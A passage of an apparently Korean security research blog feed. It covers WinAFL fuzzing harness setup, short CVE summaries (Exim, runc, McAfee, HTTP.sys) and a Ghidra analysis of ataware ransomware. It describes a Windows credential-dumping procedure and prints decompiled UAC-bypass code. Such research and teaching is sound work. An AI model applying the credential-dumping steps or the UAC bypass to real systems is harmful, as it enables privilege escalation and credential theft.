살려두고</span><span class="hljs-comment">// 컴파일러가 인라인 처리하지 않도록 설정해줍니다.</span><span class="hljs-function"><span class="hljs-keyword">wchar_t</span>* <span class="hljs-title">charToWChar</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* text)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">size_t</span> size = <span class="hljs-built_in">strlen</span>(text) + <span class="hljs-number">1</span>;<span class="hljs-keyword">wchar_t</span>* wa = (<span class="hljs-keyword">wchar_t</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">wchar_t</span>) * size);mbstowcs(wa, text, size);<span class="hljs-keyword">return</span> wa;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><span class="hljs-function"></span>&#123;SetDllDirectory(<span class="hljs-string">&quot;...&quot;</span>); <span class="hljs-comment">// Dll 경로</span>HMODULE DLLHandle = LoadLibrary(<span class="hljs-string">&quot;TargetDll.dll&quot;</span>); <span class="hljs-comment">// 타겟 DLL</span><span class="hljs-keyword">if</span> (DLLHandle == <span class="hljs-number">0</span>)&#123;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Cannot load TargetDll.dll\n&quot;</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;&#125;funcPtr = (TARGET)DLLHandle + <span class="hljs-number">0xbf5c0</span>; <span class="hljs-comment">// base + offset</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%x\n&quot;</span>, DLLHandle);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%x\n&quot;</span>, funcPtr);<span class="hljs-keyword">int</span> result = fuzzme(funcPtr, charToWChar(argv[<span class="hljs-number">1</span>]));<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, result);&#125;</code></pre><p>파일 이름을 <code>main</code>의 <code>argv</code>로 받아와 <code>fuzzme</code>를 거쳐 타겟 함수를 실행하는 Harness 코드입니다. 타겟 DLL이 32bit고 WinAFL도 32bit로 빌드했는데 Harness를 64bit로 컴파일하면 안 되겠죠? 32bit로 컴파일해줍니다.</p><pre><code class="hljs lsl">cd %DynamoRIO경로%\bin32drrun.exe -c <span class="hljs-string">&quot;%winafl경로%<span class="hljs-subst">\\</span>build32<span class="hljs-subst">\\</span>bin<span class="hljs-subst">\\</span>Release<span class="hljs-subst">\\</span>winafl.dll&quot;</span> -debug -target_module harness.exe -coverage_module <span class="hljs-string">&quot;%타겟DLL경로%&quot;</span> -target_method fuzzme -fuzz_iterations <span class="hljs-number">10</span> -nargs <span class="hljs-number">1</span> -- <span class="hljs-string">&quot;%harness경로%&quot;</span> <span class="hljs-string">&quot;%파일경로%&quot;</span></code></pre><p>이제 작성한 Harness를 디버그 모드로 테스트해볼 시간입니다. DanamoRIO의 bin32 폴더로 들어가 위와 같은 명령어를 통해 Harness가 퍼징에 적합한지 검사할 수 있습니다.</p><p><img src="/2021/05/23/fabu1ous/winafl-1/11.png"></p><p>테스트가 끝나면 bin32 폴더에 테스트 로그가 남아있습니다. 위 명령어는 테스트 옵션 중 <code>iterations</code>를 10으로 주었으므로 총 10번의 실행이 로그에 남아있어야 하며 “Everything appears to be running normally.”라는 로그가 있다면 성공입니다.</p><h1 id="마구-퍼징하기"><a href="#마구-퍼징하기" class="headerlink" title="마구 퍼징하기"></a>마구 퍼징하기</h1><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> <span class="hljs-string">&quot;%winafl-master%경로\build32\bin\Release&quot;</span><span class="hljs-attribute">afl</span>-fuzz.exe -i in -o out -D %DynamoRIO경로% -t <span class="hljs-number">10000</span> -- -coverage_module TargetDll.dll -target_module harness.exe - target_method fuzzme -fuzz_iterations <span class="hljs-number">5000</span> -nargs <span class="hljs-number">1</span> -- <span class="hljs-string">&quot;%harness경로&quot;</span> @@</code></pre><p>자! 드디어 퍼징을 할 때가 왔습니다. 빌드한 WinAFL 폴더로 이동한 후 위 명령어를 입력해 퍼징을 시작합니다. WinAFL이 <code>fuzzme</code> 함수를 5000번 실행하고 프로세스를 재시작하도록 옵션을 주었습니다.</p><p><img src="/2021/05/23/fabu1ous/winafl-1/12.png"></p><p>이렇게 하면 WinAFL은 엄청난 속도로 펒…</p><p><img src="/2021/05/23/fabu1ous/winafl-1/13.png"></p><p><img src="/2021/05/23/fabu1ous/winafl-1/14.png"></p><h1 id="Part-2-예고"><a href="#Part-2-예고" class="headerlink" title="Part 2 예고"></a>Part 2 예고</h1><p>3초에 1번 꼴로 타겟이 실행되는 걸 보면 Harness에 큰 하자가 있는 것이 분명합니다. 다음 글에선 이 실행 속도를 개선하기 위해 삽질한 과정을 작성해 오도록 하겠습니다.</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>winafl</tag>
      
      <tag>fuzzing</tag>
      
      <tag>harness</tag>
      
      <tag>bug bounty</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Dumping Stored Credentials with SeTrustedCredmanAccessPrivilege</title>
    <link href="/2021/05/23/j0ker/2021-05-23/"/>
    <url>/2021/05/23/j0ker/2021-05-23/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.tiraniddo.dev/2021/05/dumping-stored-credentials-with.html">Dumping Stored Credentials with SeTrustedCredmanAccessPrivilege</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Windows에서는 <code>Credential Manager</code>를 통해 credential를 조작할 수 있습니다. Credential들은 DPAPI를 통해 보호되며, 시스템에 인증된 사용자만 접근할 수 있습니다.</p><p>예를 들어, Remote Desktop Client에서는 <code>CredWrite</code>라는 API를 통해 domain credential을 저장합니다. 이 때 <code>CREDENTIAL</code> 구조체에 유저명과 비밀번호를 저장하게 되며 type은 <code>CRED_TYPE_DOMAIN_PASSWORD</code>으로 세팅됩니다. 이렇게 저장된 credential들은 <code>CredRead</code>, <code>CredEnumerate</code> 같은 API를 통해 읽어올 수 있지만, <code>CRED_TYPE_DOMAIN_PASSWORD</code>로 type이 세팅되면 credential을 읽어와도 구조적으로 비밀번호를 읽을 수 없게 구현되어 있습니다. NTLM, Kerberos, TSSSP 같이 LSASS 프로세스에서 실행되는 보안 패키지들은 내부 API를 통해 이런 제약 없이 credential 비밀번호에 접근이 가능합니다.</p><p>Credential은 사용자의 <code>DPAPI</code> 키로 암호화되어 파일 형식으로 저장됩니다. 이를 직접적으로 복호화하여 비밀번호를 읽어올<code>수 없는 이유는 사용자의</code>DPAPI<code>키를 사용하더라도 LSASS에서 실행되는 코드에서만 DPAPI를 호출하여 복호화할 수 있도록 구현되어 있기 때문입니다. 따라서</code>Mimikatz<code>같은 툴에서는</code>LSASS`에 코드를 삽입하거나 메모리를 바로 읽어들이는 등 방식을 통해 credential을 읽어들입니다.</p><p>이 글에서 James Forshaw는 <code>LSASS</code>에 코드를 삽입하지 않고 <code>SeTrustedCredmanAccessPrivilege</code> 권한을 이용해 credential을 복호화하는 새로운 방법을 제안합니다.</p><p><code>SeTrustedCredmanAccessPrivilege</code>권한은 사용자가 인증된 사용자로서 <code>Credential Manager</code>에 접근할 수 있도록 하는 권한입니다. LSASRV.dll에 구현되어 있는 코드를 보면 <code>CredpIsRpcClientTrusted</code> 함수에서 해당 권한을 체크하는데, 이 함수는 <code>CredrReadByTokenHandle</code>와 <code>CredrBackupCredentials</code> 이 두 함수에서만 호출됩니다. 이 중 <code>CredBackupCredentials</code> 함수는 사용자의 credential을 백업하는 기능을 제공하며 <code>SeTrustedCredmanAccessPrivilege</code> 권한만 가지고 있으면 호출이 가능합니다. <code>CREDWIZ.exe</code> 프로그램에서 해당 함수를 사용합니다. <code>CREDWIZ.exe</code>를 실행하면 백업할 경로를 지정하고 <code>Winlogon</code> 프로세스에 RPC를 호출하여 credential을 백업하는데, 이 때 백업하는 데이터에는 모든 정보가 포함되어 있습니다. 이를 다시 복구하며 모든 정보가 담겨 있는 credential을 얻을 수 있습니다.</p><p>따라서 관리자 권한으로 아래 과정을 통해 모든 사용자의 credential을 획득할 수 있습니다.</p><ol><li><code>WinLogon</code> 프로세스에 접근해 토큰의 핸들을 획득합니다.</li><li>획득한 토큰을 Impersonation 토큰으로 복사하고 <code>SeTrustedCredmanAccessPrivilege</code> 권한을 활성화합니다.</li><li>인증된 사용자의 토큰을 Open 합니다.</li><li>Impersonation된 <code>WinLogon</code> 토큰을 활용하여 <code>CredBackupCredentials</code> 함수를 호출하고 원하는 경로에 crendential을 저장합니다. 이 때 백업 시 비밀번호는 NULL로 설정할 수 있어 추가적인 복호화할 수고를 덜 수 있습니다.</li><li>Impersonation 상태에서 <code>CryptUnprotectData</code> 함수를 통해 credential을 복호화합니다.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>j0ker</tag>
      
      <tag>token</tag>
      
      <tag>privileges</tag>
      
      <tag>setrustedcredmanaccessprivilege</tag>
      
      <tag>credentials</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-28018: Unix 계열 메일 에이전트 RCE</title>
    <link href="/2021/05/22/fabu1ous/2021-05-22/"/>
    <url>/2021/05/22/fabu1ous/2021-05-22/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://adepts.of0x.cc/exim-cve-2020-28018/">CVE-2020-28018 (Use-After-Free in Exim)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Exim 4 &lt;= 4.92.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Unix 계열 운영 체제의 MTA(Mail Transfer Agent)인 Exim에서 use-after-free 취약점이 발견되었습니다. <code>tls-openssl.c</code>에 존재하는 해당 취약점을 통해 로컬 권한 상승 및 원격 코드 실행을 할 수 있습니다. </p><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> tls<span class="hljs-constructor">_write(<span class="hljs-params">void</span> <span class="hljs-operator">*</span> <span class="hljs-params">ct_ctx</span>, <span class="hljs-params">const</span> <span class="hljs-params">uschar</span> <span class="hljs-operator">*</span><span class="hljs-params">buff</span>, <span class="hljs-params">size_t</span> <span class="hljs-params">len</span>, BOOL <span class="hljs-params">more</span>)</span>&#123;...  corked = <span class="hljs-built_in">string</span><span class="hljs-constructor">_catn(<span class="hljs-params">corked</span>, <span class="hljs-params">buff</span>, <span class="hljs-params">len</span>)</span>;    ...  <span class="hljs-keyword">if</span> (more)    return len;  buff = CUS corked-&gt;s;  len = corked-&gt;ptr;  corked = NULL;...&#125;</code></pre><p>위는 <code>tls-openssl.c</code>의 함수 <code>tls_write()</code> 일부 코드입니다. 함수 <code>string_catn()</code>는 <code>gstring</code> 구조체가 request 데이터를 담기에 충분한 메모리 공간을 가지고 있는지 검사하고 <code>gstring_grow()</code>를 호출해 새로운 청크를 할당한 후 <code>gstring-&gt;s</code> 필드에 저장합니다. <code>string_catn()</code>이 반환한 <code>gstring</code> 포인터를 <code>corked</code>에 저장하고 이후에 <code>gstring</code>에 접근해야 할 일이 생기면 <code>corked</code>를 사용합니다. 문제는 <code>corked</code>가 NULL로 초기화되는 루틴을 무시할 수 있어 <code>corked-&gt;s</code>가  해제된 이후에도 <code>corked</code>를 통해 접근(use-after-free)할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>lpe</tag>
      
      <tag>unix</tag>
      
      <tag>exim</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-30465: Docker, Kubernetes의 runc Container Escape 취약점</title>
    <link href="/2021/05/21/l0ch/2021-05-21/"/>
    <url>/2021/05/21/l0ch/2021-05-21/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2021/q2/157">CVE-2021-30465: runc &lt;1.0.0-rc95 vulnerable to symlink-exchange attack</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>runc ≤ 1.0.0-rc94 </li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Docker, Kubernetes 등 대부분의 컨테이너 기반 가상화 서비스에서 사용되는 runc에서 취약점이 발견되어 세부 보고서가 공개되었습니다.</p><p>runc는 OCI(Open Container Initiative) 표준을 기반으로 컨테이너 생성과 실행을 위해 설계된 CLI 도구입니다. 지난 2019년 Container escape 취약점(CVE-2019-5736)이 공개된 데 이어 이번에 공개된 취약은 symlink exchange attack으로 호스트 파일 시스템이 컨테이너에 마운트 되도록 할 수 있는 escape 취약점입니다.</p><p>컨테이너가 시작되고 runc가 컨테이너 공유 볼륨 내부에 마운트 되는 경우 runc는 마운트 되는 대상을 검사합니다. 이때 마운트 대상을 컨테이너 rootfs 외부의 호스트 파일 시스템의 심볼릭 링크로 교체하면 컨테이너를 escape 해 컨테이너에서 호스트 파일 시스템에 접근할 수 있습니다. 일반적인 경우 <code>MS_SLAVE</code> 전파 타입이 적용된 마운트 네임스페이스 내에서는 호스트에 접근할 수 없지만 Kubernetes와 같이 볼륨 관리 인프라가 존재하는 경우 다음과 같이 컨테이너에서 호스트 파일 시스템을 마운트 할 수 있습니다.</p><ol><li>해커는 잘 알려진 호스트의 볼륨 관리에 사용되는 경로로 접근</li><li>마운트 소스 디렉토리에 호스트의 <code>/</code> 에 대한 심볼릭 링크를 생성하는 악성코드 실행</li><li>컨테이너의 후속 마운트에서 toctou를 트리거해 <code>/</code> 를 마운트</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>toctou</tag>
      
      <tag>escape</tag>
      
      <tag>docker</tag>
      
      <tag>L0ch</tag>
      
      <tag>vulnerability</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-23874: McAfee COM-objects 권한 상승 취약점</title>
    <link href="/2021/05/20/idioth/2021-05-20/"/>
    <url>/2021/05/20/idioth/2021-05-20/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://the-deniss.github.io/posts/2021/05/17/discovering-and-exploiting-mcafee-com-objects.html">Discovering and exploiting McAfee COM-objects (CVE-2021-23874)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>McAfee Total Protection 16.0.30 이전 버전</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>McAfee의 플래그십 안티 바이러스 제품 McAfee Total Protection의 COM 객체에서 local privilege escalation이 가능한 취약점이 발견되었습니다.</p><p>McAWFwk 서비스에서 <code>CoInitializeSecurity</code> 함수가 호출될 때 <code>pSecDesc</code> 파라미터는 널 포인터이며 <code>dwCapabilities</code>의 값은 0입니다. <code>dwCapabilities</code> 파라미터에 <code>EOAC_AAPID</code>나 <code>EOAC_ACCESS_CONTROL</code> 플래그가 설정되어 있지 않으면, <code>CoInitializeSecurity</code>는 <code>pSecDesc</code>를 액세스 검사에 사용하는 포인터로 인식합니다. 따라서 <code>pSecDesc</code>가 널 포인터이므로 ACL 검사를 수행하지 않습니다.</p><p>이를 통해 시작 시 <code>IMcClassFactory</code>를 통해 <code>CoManageOem Class</code> 객체를 구현하고 <code>IMcClassFactory::InternalCreateObject</code>를 통해 객체를 반환 받아 <code>ImanageOem::RunProgram</code>을 통해 <code>NT Authority\System</code> 권한으로 임의 프로세스 실행이 가능합니다. 하지만 COM 객체를 구현할 때 ProxyStub DLL에 self-defense 기능이 존재합니다. 이는 PEB 구조를 수정하여 <code>ValidateModule</code> 함수의 유효성 검사 시 프록시가 호출되는 모듈의 경로를 스푸핑하여 우회가 가능합니다. 첫 번째 검사가 수행되기 전에 McAfee의 서명이 된 아무 바이너리의 경로를 <code>MasqueradeImagePath</code> 함수를 호출하여 우회가 가능합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>mcafee</tag>
      
      <tag>idioth</tag>
      
      <tag>com</tag>
      
      <tag>arbitrary process execution</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-31166: HTTP.sys 원격 코드 실행 취약점</title>
    <link href="/2021/05/19/fabu1ous/2021-05-19/"/>
    <url>/2021/05/19/fabu1ous/2021-05-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/5/17/cve-2021-31166-a-wormable-code-execution-bug-in-httpsys">A WORMABLE CODE EXECUTION BUG IN HTTP.SYS</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows 10</p><p>Windows server 2004</p><p>Windows server 20H2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>커널 드라이버 Http.sys를 사용하는 웹서버 IIS(Internet Information services) Windows Server에서 원격 코드 실행 취약점이 발견되었습니다. Http.sys는 http request 파싱 및 클라이언트로 보낼 response 생성을 담당합니다. 해당 취약점은 Http request header <code>Accept-Encoding</code>을 파싱 하고 관리하는 메커니즘의 설계 결함으로 발생합니다. </p><p>클라이언트는  <code>Accept-Encoding</code> header를 사용해 웹서버에게 사용 가능한 데이터 압축 방식을 전달합니다. 웹서버는 전달받은  <code>Accept-Encodeing</code>의 필드 값을 파싱하고 unknown, supported, invalid로 구분해 연결 리스트를 생성하고 관리합니다. unknown의 경우 원형 이중 연결 리스트를 사용하고, 파싱이 끝나 연결 리스트가 완성되면 스택 메모리에 있는 기존 root 노드를 버리고 internal structure 속 root 노드로 연결 리스트를 옮기는 작업을 합니다. 이때 기존 root 노드가 초기화되지 않아 여전히 연결 리스트에 연결되어 있고 이를 통해 use-after-free가 발생합니다. 해커는 이를 악용한 악성 HTTP request를 원격 시스템에 보내 Kernel 권한으로 임의 코드 실행을 할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>rce</tag>
      
      <tag>wormable</tag>
      
      <tag>http</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Re:versing으로 시작하는 ghidra 생활 Part 4 - Malware Analysis (1)</title>
    <link href="/2021/05/19/idioth/ghidra_part4/"/>
    <url>/2021/05/19/idioth/ghidra_part4/</url>
    
    <content type="html"><![CDATA[<p><strong>다른 파트 보러가기</strong></p><p><a href="https://hackyboiz.github.io/2021/02/07/idioth/ghidra_part1/">Re:versing으로 시작하는 ghidra 생활 Part 1 - Overview</a></p><p><a href="https://hackyboiz.github.io/2021/03/07/idioth/ghidra_part2/">Re:versing으로 시작하는 ghidra 생활 Part 2 - Data, Functions, Scripts</a></p><p><a href="https://hackyboiz.github.io/2021/04/04/idioth/ghidra_part3/">Re:versing으로 시작하는 ghidra 생활 Part 3 - tips for IDA User (Here!)</a></p><p>Re:versing으로 시작하는 ghidra 생활 Part 4 - Malware Analysis (1) (Here!)</p><p><a href="https://hackyboiz.github.io/2021/07/11/idioth/ghidra_part5/">Re:versing으로 시작하는 ghidra 생활 Part 5 - Malware Analysis (2)</a></p><hr><p>반갑습니다. 3일 만에 뵙는군요. 일요일 번역 글에서 말씀 드렸다시피 ghidra 글을 빠르게(?) 작성을 해왔습니다.</p><p>사실상 분석을 하면서 느낀 점은 아 이거 일일이 다 세세하게 하면 뭔가 주객이 전도되는 거 같은데… ghidra 글이 아니라 악성코드 분석에 초점이 맞춰지는 거 아닌가? <del>틀린 부분이 있으면 어떡하지</del>라는 생각으로 인해 가볍게 어떠한 식으로 분석을 하기 편하게 디컴파일러를 설정할 수 있는지! 중점으로 다룰 예정입니다. </p><p>분석을 해볼 악성코드는 ataware 랜섬웨어입니다. 스크립트 → ATAPIinit → ATAPIConfiguration → ATAPIUpdtr 순으로 바이너리를 드롭하고 악성 행위를 진행합니다.</p><p>해당 글은 ghidra에 관련된 글이기 때문에 뒤에 세 개의 바이너리를 분석할 예정입니다. 이번 게시글에서는 ATAPinit에 대해서 다루어 봅시다!</p><h1 id="ghidra를-통해-분석-고고"><a href="#ghidra를-통해-분석-고고" class="headerlink" title="ghidra를 통해 분석 고고"></a>ghidra를 통해 분석 고고</h1><p>ATAPIinit 바이너리는 <a href="https://app.any.run/tasks/e8e682e8-6d7f-42c8-ad3f-6afa980a77e3/">app.any.run</a>에서 받으실 수 있습니다.</p><p>일단 먼저 해당 바이너리에 대해서 알아보기 위해 Detect It Easy에 ATAPinit을 넣어봅시다.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled.png"></p><p>MinGW로 컴파일되었으며, 32비트 바이너리네요.</p><p>문자열을 확인을 해서 어떤 동작을 하는지 대강 유추를 해봅시다. PEStudio로 확인을 해보도록 하겠습니다.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%201.png"></p><p>눈에 띄는 문자열은 <code>Elevation:Administrator!new:</code>, <code>CLSIDFromString</code>, <code>&#123;6EDD6D74-C007-4E75-B76A-E5740995E24C&#125;</code>, <code>dl.dropboxusercontent.com</code>정도 입니다.</p><p><code>&#123;6EDD6D74-C007-4E75-B76A-E5740995E24C&#125;</code>를 통해서 구글에 검색을 해본 결과 COM Interface를 통해 UAC bypass를 하는 기법에 대해서 나오네요. <code>Elevation:Administarator!new:</code>와 연계했을 때 COM을 사용해서 권한 상승을 한 후, <code>dl.dropboxusercontent.com</code> 링크를 통해 ATAPIConfiguration을 다운로드한다라고 생각을 할 수 있습니다!</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%202.png"></p><p>앗! 그럼 이제 대충 어떤 작업을 하는지 알았으니 ghidra를 사용하여 봅시다. 🙂</p><p>악성코드 분석 파트에서는 Variable/Function rename, Data type Redefine, Redefine Function Signature 등의 기능을 많이 사용할 예정입니다. 좀 더 보기 편하게 만들기 위해서요!</p><p>먼저 새 프로젝트(저의 경우 ataware로 만들었습니다.)를 생성한 후 ATAPIinit을 추가하고 열어서 analysis를 합시다.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%203.png"></p><h2 id="UAC-Bypass-함수"><a href="#UAC-Bypass-함수" class="headerlink" title="UAC Bypass 함수"></a>UAC Bypass 함수</h2><p>Aggressive Instruction Finder는 체크가 풀려있으니 체크를 하고 Analyze를 합니다.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%204.png"></p><p><code>entry</code>에서 <code>FUN_00401570</code>을 찾습니다. 이 부분을 중점적으로(?) 분석을 해볼 계획입니다. 클릭을 해서 들어가면 여러 개의 함수를 호출합니다.</p><pre><code class="hljs c"><span class="hljs-function">undefined4 <span class="hljs-title">FUN_00401570</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  FUN_0040da90();  DAT_00416020 = FUN_00410ab0(<span class="hljs-number">0x20a</span>);  DAT_00416024 = FUN_00410ab0(<span class="hljs-number">0x20a</span>);  FUN_00401657(<span class="hljs-number">0</span>);  FUN_004017e4();  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;&#125;</code></pre><p>그중에서 아까 위에서 확인했던 부분인 COM을 이용하여 UAC를 우회하는 함수를 살펴봅시다! <code>FUN_004017e4()</code>로 들어가시면 됩니다. 처음 들어갔을 때, 디컴파일러에서 나오는 코드는 다음과 같습니다.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FUN_004017e4</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  HMODULE pHVar1;  <span class="hljs-keyword">int</span> iVar2;  undefined *puVar3;  <span class="hljs-keyword">int</span> **ppiVar4;  <span class="hljs-keyword">wchar_t</span> local_27c [<span class="hljs-number">260</span>];  undefined4 local_74 [<span class="hljs-number">5</span>];  undefined4 local_60;  <span class="hljs-keyword">int</span> *local_50;  undefined local_4c [<span class="hljs-number">16</span>];  undefined local_3c [<span class="hljs-number">16</span>];  FARPROC local_2c;  FARPROC local_28;  FARPROC local_24;  <span class="hljs-keyword">int</span> local_20;  FARPROC local_1c;  HMODULE local_18;  <span class="hljs-keyword">int</span> local_14;  <span class="hljs-keyword">int</span> local_10;    local_10 = <span class="hljs-number">0x80004005</span>;  local_14 = <span class="hljs-number">0</span>;  local_50 = (<span class="hljs-keyword">int</span> *)<span class="hljs-number">0x0</span>;  local_18 = LoadLibraryA(<span class="hljs-string">&quot;ole32.dll&quot;</span>);  local_1c = GetProcAddress(local_18,<span class="hljs-string">&quot;CoInitializeEx&quot;</span>);  ppiVar4 = (<span class="hljs-keyword">int</span> **)<span class="hljs-number">0x6</span>;  puVar3 = (undefined *)<span class="hljs-number">0x0</span>;  local_20 = (*local_1c)(<span class="hljs-number">0</span>,<span class="hljs-number">6</span>);  pHVar1 = GetModuleHandleW(<span class="hljs-string">L&quot;Ole32.dll&quot;</span>);  local_24 = GetProcAddress(pHVar1,<span class="hljs-string">&quot;CLSIDFromString&quot;</span>);  pHVar1 = GetModuleHandleW(<span class="hljs-string">L&quot;Ole32.dll&quot;</span>);  local_28 = GetProcAddress(pHVar1,<span class="hljs-string">&quot;IIDFromString&quot;</span>);  <span class="hljs-keyword">do</span> &#123;    iVar2 = (*local_24)(<span class="hljs-string">L&quot;&#123;3E5FC7F9-9A51-4367-9063-A120244FBEC7&#125;&quot;</span>,local_4c,puVar3,ppiVar4);    <span class="hljs-keyword">if</span> ((iVar2 != <span class="hljs-number">0</span>) ||       (iVar2 = (*local_28)(<span class="hljs-string">L&quot;&#123;6EDD6D74-C007-4E75-B76A-E5740995E24C&#125;&quot;</span>,local_3c), iVar2 != <span class="hljs-number">0</span>)) <span class="hljs-keyword">break</span>;    FUN_0040f860((undefined *)local_27c,<span class="hljs-number">0x208</span>);    wcscpy(local_27c,<span class="hljs-string">L&quot;Elevation:Administrator!new:&quot;</span>);    wcscat(local_27c,<span class="hljs-string">L&quot;&#123;3E5FC7F9-9A51-4367-9063-A120244FBEC7&#125;&quot;</span>);    FUN_0040f860((undefined *)local_74,<span class="hljs-number">0x24</span>);    local_74[<span class="hljs-number">0</span>] = <span class="hljs-number">0x24</span>;    local_60 = <span class="hljs-number">4</span>;    pHVar1 = GetModuleHandleW(<span class="hljs-string">L&quot;Ole32.dll&quot;</span>);    local_2c = GetProcAddress(pHVar1,<span class="hljs-string">&quot;CoGetObject&quot;</span>);    ppiVar4 = &amp;local_50;    puVar3 = local_3c;    local_10 = (*local_2c)(local_27c,local_74);    FUN_00401a0f();    local_10 = (**(code **)(*local_50 + <span class="hljs-number">0x24</span>))(local_50,DAT_00416028,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>);  &#125; <span class="hljs-keyword">while</span> (local_14 != <span class="hljs-number">0</span>);  <span class="hljs-keyword">if</span> (local_50 != (<span class="hljs-keyword">int</span> *)<span class="hljs-number">0x0</span>) &#123;    (**(code **)(*local_50 + <span class="hljs-number">8</span>))(local_50);  &#125;  <span class="hljs-keyword">return</span>;&#125;</code></pre><p><code>GetProcAddress</code>로 함수들의 주소를 가져와서… 함수 포인터로 실행을 하는데 뭐가 무엇을 하는지  눈에 확인하기가 어렵습니다. 이럴 때는 Rename Variable (L)과 Retype Variable (Ctrl + L)을 사용하여 한눈에 보기 쉽게 만들 수도 있고, 파라미터로 들어가는 값들의 데이터 타입도 자동으로 맞춰 줍니다.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%205.png"></p><p><code>local_18</code>과 <code>local_1c</code>의 이름을 변경했습니다. <code>FARPROC</code>으로 되어있는 <code>CoInitializeEx_addr</code>은 <code>CoInitializeEx</code>의 주소를 담고 있으니, 데이터 타입을 <code>CoInitializeEx *</code>로 바꾸어볼까요?</p><p><code>CoInitializeEx_addr</code>에 마우스 커서를 올리고 우클릭 후 Retype Variable 혹은 Ctrl + L을 누르면 다음과 같은 창이 뜹니다. 거기에 적혀있는 <code>FARPROC</code>을 지우고 <code>CoInitializeEx *</code>를 작성한 후 OK!</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%206.png"></p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%207.png"></p><p>그럼 위와 같이 함수 타입을 설정하는 창이 뜹니다. 우리가 사용할 함수가 맞으니까 OK 버튼을 눌러주면 다음과 같이 바뀝니다.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%208.png"></p><p>한눈에 보기 훨씬 편해졌습니다.</p><p>다른 부분도 위와 동일하게 Rename, Retype을 진행한 후 해당 함수에서 호출하는 다른 함수들이 어떠한 동작을 하는지 확인해봅시다.</p><p>먼저 <code>FUN_0040f860</code>를 